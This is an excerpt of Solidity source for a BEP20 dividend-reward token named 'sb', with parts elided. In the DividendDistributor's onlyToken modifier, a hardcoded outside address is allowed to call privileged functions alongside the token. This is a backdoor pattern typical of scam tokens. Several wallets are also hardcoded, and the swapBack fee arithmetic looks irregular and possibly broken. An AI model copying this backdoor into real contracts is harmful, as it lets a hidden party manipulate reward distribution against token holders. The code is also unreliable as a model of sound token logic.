...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xB2050b9772409E3D5935ea48c0aE2A9036074421)); _;
    }

    constructor (address _router,address _RewardTokenSET) {
        
        router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(routerAddress);
        RewardTokenSET = _RewardTokenSET != address(0) ? address(_RewardTokenSET) : address(0xEdA5dA0050e21e9E34fadb1075986Af1370c7BDb);
...
contract sb is IBEP20 , Ownable, BaseToken {
    ...
    address routerAddress= 0xB6BA90af76D139AB3170c7df0139636dB6120F7e;
    address RewardToken = 0xEdA5dA0050e21e9E34fadb1075986Af1370c7BDb;
    ...
    constructor(
        ...
        _totalSupply = 21 * 10**8  * 10**_decimals ;


        
        RewardToken = 0xEdA5dA0050e21e9E34fadb1075986Af1370c7BDb;
        ...
        // NICE!
        autoLiquidityReceiver = 0xC239E377a34E7D57E8d768bbefE2935b9702Ba20;
        atuoBuybackWallet  = msg.sender;
        marketingWallet = 0x849060D55bbD37163B89fAA503C7391ef2668f1c;  //marketingwallet
        team  = 0x849060D55bbD37163B89fAA503C7391ef2668f1c;
    ...
    function swapBack() internal lockTheSwap {
        ...
        uint256 totalBNBFee = totalFee.sub(liquidityFee.sub(2).div(2));
